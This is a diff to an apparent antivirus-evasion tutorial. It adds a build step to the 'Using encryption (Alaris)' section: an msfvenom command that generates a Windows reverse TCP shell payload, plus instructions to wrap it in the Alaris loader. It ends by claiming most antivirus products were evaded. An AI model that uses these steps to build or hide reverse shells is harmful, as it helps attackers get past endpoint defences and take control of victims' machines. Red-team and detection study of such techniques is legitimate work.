@@ -7,7 +7,6 @@
     - Basic msf payload
     - Using SigThief
     - Using xor 
-    - Using shellcode with C shellcode loader
     - Using encryption (Alaris)
     
 ## Introduction 
@@ -62,8 +61,17 @@ Well we are making some progress now.
 ### Using encryption (Alaris)
 Alarix is a protective PE file loader which does not allow any function hooking and in memory inspection whihch Avs use for detection.
 
+- Build
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
+```
+And now replace the shellcode with the loader from alaris and build the solution in visual studio
+
+![Alt Text](https://i.ibb.co/MZSNDFV/alaris.png)
+
 
 - Result
 
 ![Alt Text](https://i.ibb.co/dMc2Zvg/alarix.png)
 
+Finally we managed to invade most Avs with basic methods for now. With that it might we now can finish this post here for now
